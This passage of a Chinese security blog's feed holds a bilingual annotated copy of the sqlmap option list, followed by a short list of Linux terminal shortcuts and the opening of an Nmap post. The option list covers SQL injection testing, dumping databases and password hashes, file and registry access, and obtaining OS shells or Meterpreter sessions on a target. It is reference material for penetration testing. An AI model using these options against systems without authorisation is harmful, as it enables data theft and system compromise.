&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --safe-req=SAFER..  Load safe HTTP request from a file                        从文件加载安全HTTP请求  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --safe-freq=SAFE..  Test requests between two visits to a given safe URL      在两次访问给定安全网址之间测试请求
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --skip-urlencode    Skip URL encoding of payload data                         跳过有效载荷数据的URL编码  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --csrf-token=CSR..  Parameter used to hold anti-CSRF token                    参数用于保存anti-CSRF令牌  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token           提取anti-CSRF URL地址访问令牌  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --force-ssl         Force usage of SSL/HTTPS                                  强制使用SSL / HTTPS    
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --hpp               Use HTTP parameter pollution method                       使用HTTP参数pollution的方法 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.    评估请求之前提供Python代码  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                        &amp;#34;&lt;/span&gt;import hashlib;id2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;hashlib.md5&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.hexdigest&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  Optimization（优化）:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    这些选项可用于优化SqlMap的性能。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -o                  打开所有优化开关
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --predict-output    预测常见的查询输出
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --keep-alive        使用持久的HTTP（S）连接
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --null-connection   从没有实际的HTTP响应体中检索页面长度
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --threads=THREADS   最大的HTTP（S）请求并发量（默认为1）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  Injection（注入）:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -p TESTPARAMETER    可测试的参数（S）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --skip=SKIP         Skip testing for given parameter(s)    跳过对给定参数的测试  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --skip-static       Skip testing parameters that not appear to be dynamic    跳过测试不显示为动态的参数  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --param-exclude=..  Regexp to exclude parameters from testing (e.g. &amp;#34;&lt;/span&gt;ses&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)    使用正则表达式排除参数进行测试（e.g. &amp;#34;&lt;/span&gt;ses&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --dbms=DBMS         强制后端的DBMS为此值
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --dbms-cred=DBMS..  DBMS认证凭证(user:password)   
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --os=OS             强制后端的DBMS操作系统为这个值
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --invalid-bignum    使用大数字使值无效  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --invalid-logical   使用逻辑操作使值无效  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --invalid-string    使用随机字符串使值无效  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --no-cast           Turn off payload casting mechanism    关闭有效载荷铸造机制  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --no-escape         Turn off string escaping mechanism    关闭字符串转义机制  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --prefix=PREFIX     注入payload字符串前缀
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --suffix=SUFFIX     注入payload字符串后缀
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --tamper=TAMPER     使用给定的脚本（S）篡改注入数据
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  Detection（检测）:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    这些选项可用于自定义检测阶段。即这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --level=LEVEL       执行测试的等级（1-5，默认为1）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --risk=RISK         执行测试的风险（0-3，默认为1）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --string=STRING     查询有效时，在页面匹配字符串。即当查询被评估为True时，字符串匹配
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --not-string=NOT..  String to match when query is evaluated to False
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --regexp=REGEXP     查询有效时，在页面匹配正则表达式
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --code=CODE         HTTP code to match when query is evaluated to True
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --text-only         仅基于在文本内容比较网页
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --titles            Compare pages based only on their titles    仅根据他们的标题进行比较
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  Techniques（技巧）:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    这些选项可用于调整具体的SQL注入测试。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --technique=TECH    SQL注入技术测试（默认BEUST）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection    定列范围用于测试UNION查询注入  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --union-char=UCHAR  Character to use for bruteforcing number of columns       用于暴力猜解列数的字符  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection    要在UNION查询SQL注入的FROM部分使用的表
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --dns-domain=DNS..  Domain name used for DNS exfiltration attack              域名用于DNS漏出攻击 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --second-order=S..  Resulting page URL searched for second-order response     生成页面的URL搜索为second-order响应  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  Fingerprint（指纹）:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -f, --fingerprint   Perform an extensive DBMS version fingerprint。 执行检查广泛的DBMS版本指纹
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  Enumeration(枚举):
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -a, --all           Retrieve everything
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -b, --banner        Retrieve DBMS banner                      //检索数据库管理系统的标识
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --current-user      Retrieve DBMS current user                // 检索数据库管理系统当前用户
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --current-db        Retrieve DBMS current database            //检索数据库管理系统当前数据库
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --hostname          Retrieve DBMS server hostname
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --is-dba            Detect if the DBMS current user is DBA    //检测DBMS当前用户是否DBA
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --users             Enumerate DBMS users                      //枚举数据库管理系统所有的用户
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --passwords         Enumerate DBMS users password hashes      //枚举数据库管理系统用户密码哈希
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --privileges        Enumerate DBMS users privileges           //枚举数据库管理系统用户的权限
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --roles             Enumerate DBMS users roles                //枚举数据库管理系统用户的角色
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --dbs               Enumerate DBMS databases                  //枚举数据库管理系统所有数据库
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --tables            Enumerate DBMS database tables            //枚举的DBMS数据库中所有的表
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --columns           Enumerate DBMS database table columns     //枚举DBMS数据库表所有的列
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --schema            Enumerate DBMS schema
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --count             Retrieve number of entries for table(s)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --dump              Dump DBMS database table entries          //转储数据库管理系统的数据库中的表项
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --dump-all          Dump all DBMS databases tables entries    //转储所有的DBMS数据库表中的条目
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --search            Search column(s), table(s) and/or database name(s)    //搜索列（S），表（S）和/或数据库名称（S）
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --comments          Retrieve DBMS comments
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -D DB               DBMS database to enumerate                               // 要进行枚举的指定数据库名
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -T TBL              DBMS database table(s) to enumerate                      // 要进行枚举的指定数据库表(如：-T tablename –columns)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -C COL              DBMS database table column(s) to enumerate               //要进行枚举的数据库列
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -X EXCLUDECOL       DBMS database table column(s) to not enumerate
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -U USER             DBMS user to enumerate                                   //用来进行枚举的数据库用户
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables    //枚举表时排除系统数据库
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --pivot-column=P..  Pivot column name
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --where=DUMPWHERE   Use WHERE condition while table dumping
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --start=LIMITSTART  First query output entry to retrieve                //第一个查询输出进入检索
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --stop=LIMITSTOP    Last query output entry to retrieve                 //最后查询的输出进入检索
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --first=FIRSTCHAR   First query output word character to retrieve       //第一个查询输出字的字符检索
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --last=LASTCHAR     Last query output word character to retrieve        //最后查询的输出字字符检索
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --sql-query=QUERY   SQL statement to be executed                        //要执行的SQL语句
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --sql-shell         Prompt for an interactive SQL shell                 // 提示交互式SQL的shell
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --sql-file=SQLFILE  Execute SQL statements from given file(s)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  Brute force（野蛮、蛮力）:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    这些选项可以被用来运行蛮力检查。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --common-tables     Check existence of common tables    // 检查存在共同表
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --common-columns    Check existence of common columns   // 检查存在共同列
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  User-defined function injection（用户自定义函数注入）:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    这些选项可以用来创建用户自定义函数。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --udf-inject        Inject custom user-defined functions  // 注入用户自定义函数
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --shared-lib=SHLIB  Local path of the shared library      // 共享库的本地路径
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  File system access（访问文件系统）:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    这些选项可以被用来访问后端数据库管理系统的底层文件系统。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --file-read=RFILE   Read a file from the back-end DBMS file system          // 从后端的数据库管理系统文件系统读取文件
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --file-write=WFILE  Write a local file on the back-end DBMS file system     // 编辑后端的数据库管理系统文件系统上的本地文件
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --file-dest=DFILE   Back-end DBMS absolute filepath to write to             // 后端的数据库管理系统写入文件的绝对路径
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  Operating system access（操作系统访问）:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    这些选项可以用于访问后端数据库管理系统的底层操作系统。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --os-cmd=OSCMD      执行操作系统命令
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --os-shell          Prompt for an interactive operating system shell          // 交互式的操作系统的shell
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC               // 获取一个OOB shell，meterpreter或VNC
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC     // 一键获取一个OOB shell，meterpreter或VNC
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --os-bof            Stored procedure buffer overflow exploitation             // 存储过程缓冲区溢出利用
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --priv-esc          Database process user privilege escalation                // 数据库进程用户权限提升
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --msf-path=MSFPATH  Local path where Metasploit Framework is installed        // Metasploit Framework本地的安装路径
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --tmp-path=TMPPATH  Remote absolute path of temporary files directory         // 远程临时文件目录的绝对路径
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  Windows registry access（Windows注册表访问）:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    这些选项可以被用来访问后端数据库管理系统Windows注册表。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --reg-read          读一个Windows注册表项值
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --reg-add           写一个Windows注册表项值数据
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --reg-del           删除Windows注册表键值
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --reg-key=REGKEY    Windows注册表键
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --reg-value=REGVAL  Windows注册表项的值
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --reg-data=REGDATA  Windows注册表键值数据
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --reg-type=REGTYPE  Windows注册表项值类型
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  General（一般，通用，基本）:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    这些选项可以用来设置一些一般的工作参数。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -s SESSIONFILE      Load session from a stored (.sqlite) file               保存和恢复检索会话文件的所有数据  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -t TRAFFICFILE      Log all HTTP traffic into a textual file                记录所有HTTP流量到一个文本文件中  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --batch             Never ask for user input, use the default behaviour     从不询问用户输入，使用所有默认配置。
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --binary-fields=..  Result fields having binary values (e.g. &amp;#34;&lt;/span&gt;digest&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)      具有二进制值的结果字段  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --charset=CHARSET   Force character encoding used for data retrieval        强制用于数据检索的字符编码
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL          从目标网址开始抓取网站
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. &amp;#34;&lt;/span&gt;logout&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)   正则表达式排除网页抓取 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --csv-del=CSVDEL    Delimiting character used in CSV output (default &amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)   分隔CSV输出中使用的字符
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)   转储数据的格式
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --eta               Display for each output the estimated time of arrival   显示每个输出的预计到达时间
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --flush-session     Flush session files for current target                  刷新当前目标的会话文件  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --forms             Parse and test forms on target URL                      在目标网址上解析和测试表单
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --fresh-queries     Ignore query results stored in session file             忽略在会话文件中存储的查询结果
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --hex               Use DBMS hex function(s) for data retrieval             使用DBMS hex函数进行数据检索  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --output-dir=OUT..  Custom output directory path                            自定义输出目录路径  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --parse-errors      Parse and display DBMS error messages from responses    解析和显示响应中的DBMS错误消息
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --save=SAVECONFIG   Save options to a configuration INI file                保存选项到INI配置文件  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --scope=SCOPE       Regexp to filter targets from provided proxy log        使用正则表达式从提供的代理日志中过滤目标
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)       根据有效负载和/或标题(e.g. ROW)选择测试
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)   根据有效负载和/或标题跳过测试（e.g. BENCHMARK）  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --update            Update sqlmap                                           更新SqlMap  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;  Miscellaneous（杂项）:
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    -z MNEMONICS        Use short mnemonics (e.g. &amp;#34;&lt;/span&gt;flu,bat,ban,tec&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;EU&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)          使用简短的助记符 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --alert=ALERT       Run host OS command(s) when SQL injection is found       在找到SQL注入时运行主机操作系统命令 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --answers=ANSWERS   Set question answers (e.g. &amp;#34;&lt;/span&gt;quit&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;N,follow&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;N&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)            设置问题答案  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --beep              发现SQL注入时提醒
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables    SqlMap具体的UDF和表清理DBMS 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --dependencies      Check for missing (non-core) sqlmap dependencies         检查是否缺少（非内核）sqlmap依赖关系
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --disable-coloring  Disable console output coloring                          禁用控制台输出颜色 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --gpage=GOOGLEPAGE  Use Google dork results from specified page number       使用Google dork结果指定页码  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --identify-waf      Make a thorough testing for a WAF/IPS/IDS protection     对WAF / IPS / IDS保护进行全面测试  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --mobile            Imitate smartphone through HTTP User-Agent header 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --offline           Work in offline mode (only use session data)             在离线模式下工作（仅使用会话数据）  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --purge-output      Safely remove all content from output directory          安全地从输出目录中删除所有内容  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection       跳过启发式检测WAF / IPS / IDS保护 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --smart             Conduct thorough tests only if positive heuristic(s)     只有在正启发式时才进行彻底测试  
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --sqlmap-shell      Prompt for an interactive sqlmap shell
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --tmp-dir=TMPDIR    Local directory for storing temporary files
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --web-root=WEBROOT  Web server document root directory (e.g. &amp;#34;&lt;/span&gt;/var/www&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    --wizard            Simple wizard interface for beginner users               给初级用户的简单向导界面
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—常用快捷键</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</link>
        <pubDate>Tue, 17 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/</guid>
        <description>&lt;h2 id=&#34;快捷键&#34;&gt;快捷键&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Tab&lt;/strong&gt; ：实现自动补全参数（双击列出全部可能参数）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl-R&lt;/strong&gt;：搜索命令行历史记录（按下按键之后，输入关键字搜索，&lt;strong&gt;重复按下&lt;/strong&gt;会向后查找匹配项，按下 &lt;strong&gt;Enter&lt;/strong&gt; 会执行当前匹配的命令，而按下&lt;strong&gt;右方向键&lt;/strong&gt;会将匹配项放入当前行中，不会直接执行，以便做出修改）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl-W&lt;/strong&gt; ：剪切，删除光标前的一个单词&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl-U&lt;/strong&gt;和&lt;strong&gt;Ctrl-K&lt;/strong&gt; ：剪切，U删除光标前的所有字符，K光标后的所有字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl-Y&lt;/strong&gt;：粘贴Ctrl-W、Ctrl-U和Ctrl-K删除的字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Alt-B&lt;/strong&gt; 和 &lt;strong&gt;Alt-F&lt;/strong&gt; ：以单词为单位移动光标，B向前，F向后&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl-A&lt;/strong&gt; 和&lt;strong&gt;Ctrl-E&lt;/strong&gt;：A将光标移至行首， B将光标移至行尾&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl-L&lt;/strong&gt; ：清屏&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl-C&lt;/strong&gt;：中断终端正在执行的任务并开启一个新的一行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl-Z&lt;/strong&gt;：暂停在终端运行的任务，使用&lt;strong&gt;fg&lt;/strong&gt;命令可以使暂停恢复&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+D&lt;/strong&gt;：退出，如果是切换过来的用户，则执行这个命令回退到原用户&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+S&lt;/strong&gt;：锁定终端，使之任何人无法输入&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ctrl+Q&lt;/strong&gt;：解锁Ctrl+S的锁定状态&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;!!&lt;/strong&gt; ：执行上一条命令&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;!pw&lt;/strong&gt;：执行以pw开头的命令，这里的pw可以换成任何已经执行过的字符&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;!pw:p&lt;/strong&gt;：打印以pw开头的命令，但不执行&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Net—Nmap 端口扫描工具</title>
        <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netnmap-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Tue, 17 Nov 2020 00:00:00 +0000</pubDate>
        
